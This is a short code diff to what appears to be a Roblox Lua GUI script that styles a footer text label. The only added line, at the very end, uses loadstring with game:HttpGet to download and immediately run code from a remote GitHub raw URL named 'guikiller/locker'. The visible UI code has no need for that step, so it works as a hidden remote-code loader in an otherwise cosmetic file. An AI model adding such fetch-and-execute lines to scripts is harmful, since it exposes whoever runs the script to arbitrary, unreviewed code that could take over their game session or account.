@@ -233,3 +233,4 @@ footer.Font = FONT
 footer.TextColor3 = Color3.new(1,1,1)
 footer.TextStrokeTransparency = 0.5
 footer.TextScaled = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSpawnerV99/guikiller/refs/heads/main/locker"))()
